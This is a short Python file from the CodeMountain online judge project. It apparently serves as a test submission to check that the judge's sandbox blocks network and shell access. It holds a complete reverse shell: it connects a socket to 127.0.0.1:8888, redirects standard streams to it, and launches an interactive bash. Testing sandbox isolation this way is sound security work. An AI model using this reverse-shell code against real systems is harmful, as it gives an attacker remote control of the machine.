#!/usr/bin/python3
"""
 CodeMountain is a free and open source online judge open for everyone
 Copyright (C) 2021 MD Gaziur Rahman Noor and contributors
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

from os import dup2
from subprocess import run
import socket
print("You shouldn't see this message, if you see, immediately make an issue because this is a big vulnerability")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])